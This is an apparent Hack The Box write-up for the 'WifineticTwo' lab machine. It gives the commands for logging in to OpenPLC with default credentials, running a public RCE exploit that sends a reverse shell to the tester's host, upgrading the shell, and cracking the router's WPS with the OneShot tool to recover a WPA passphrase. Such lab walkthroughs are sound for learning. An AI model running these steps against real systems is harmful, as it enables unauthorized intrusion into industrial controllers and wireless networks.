# WifineticTwo Write-up

<img src="https://labs.hackthebox.com/storage/avatars/16c5889acc1ca177c6b343c76bebcdaf.png" width="200" height="200">

## Nmap

`nmap -sV -sC wifinetictwo.htb`

    PORT     STATE SERVICE    VERSION
    22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
    |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
    |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
    8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
    | http-title: Site doesn't have a title (text/html; charset=utf-8).
    |_Requested resource was http://10.10.11.7:8080/login
    |_http-server-header: Werkzeug/1.0.1 Python/2.7.18

![image](https://github.com/zer00d4y/writeups/assets/128820441/71a8b8b4-4bd9-4b6e-b992-87c02ce8294e)

Exploit: https://www.exploit-db.com/exploits/49803

`openplc`:`openplc`

![image](https://github.com/zer00d4y/writeups/assets/128820441/229bd09b-81b5-4725-b7c7-5bd81810a3b6)

    python3 ex.py -u http://wifinetictwo.htb:8080 -l openplc -p openplc -i 10.10.14.91 -r 4242



![image](https://github.com/zer00d4y/writeups/assets/128820441/3a1744c2-f984-4a48-bec9-93c61749200a)

    python3 -c 'import pty; pty.spawn("/bin/bash")'

![image](https://github.com/zer00d4y/writeups/assets/128820441/28e1b218-2c84-4dd6-a295-a57c352d7a3a)

    iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA"

![image](https://github.com/zer00d4y/writeups/assets/128820441/41552965-d787-477c-80e7-bc242cf10a46)

    wget https://github.com/kimocoder/OneShot/blob/master/oneshot.py?source=post_page-----33b501b69579-------

    python3 -m http.server 80

![image](https://github.com/zer00d4y/writeups/assets/128820441/82c4bfe6-66bb-4f71-9e72-fbe1a6cca826)
    
![image](https://github.com/zer00d4y/writeups/assets/128820441/4810f5a4-3e7d-4f40-bbba-33339d189823)

https://github.com/kimocoder/OneShot

https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant

    python3 one.py -i wlan0 -b 02:00:00:00:01:00 -K
    
    wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config

![image](https://github.com/zer00d4y/writeups/assets/128820441/8b5d785d-08cf-4c67-9153-1a4266dd88a2)

![image](https://github.com/zer00d4y/writeups/assets/128820441/5ce568a1-6825-45b7-a482-a55d0e1e1f63)

![image](https://github.com/zer00d4y/writeups/assets/128820441/ff19ea41-802e-42fa-bc40-29271b3a2e6d)

